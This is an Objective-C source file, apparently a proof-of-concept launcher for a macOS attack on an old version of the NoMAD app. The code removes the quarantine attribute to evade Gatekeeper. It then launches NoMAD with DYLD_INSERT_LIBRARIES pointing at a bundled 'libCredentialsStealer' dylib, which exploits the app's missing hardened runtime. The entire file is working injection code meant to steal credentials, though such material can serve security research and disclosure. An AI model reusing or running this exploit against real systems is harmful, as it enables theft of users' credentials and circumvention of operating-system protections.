#import <Cocoa/Cocoa.h>
#include <sys/xattr.h>

int main(int argc, const char * argv[]) {
    
    NSString *NoMADPath = [[NSBundle mainBundle] pathForResource:@"NoMAD" ofType:@"app"];
    NSString *NoMADExecutablePath = [NoMADPath stringByAppendingString:@"/Contents/MacOS/NoMAD"];
    NSString *CredentialsStealerDylibPath = [[NSBundle mainBundle] pathForResource:@"libCredentialsStealer" ofType:@"dylib"];
    
    // make sure that no quarantine is applied
    removexattr([NoMADPath cStringUsingEncoding:NSUTF8StringEncoding], "com.apple.quarantine", 0);
    
    NSTask *task = [NSTask new];
    task.launchPath = NoMADExecutablePath;
    // DYLD_INSERT_LIBRARIES will inject the attacker's controlled library because the old NoMAD version doesn't have the hardened runtime flag set
    task.environment = @{@"DYLD_INSERT_LIBRARIES":CredentialsStealerDylibPath};
    [task launch];
    
    
    return 0;
}
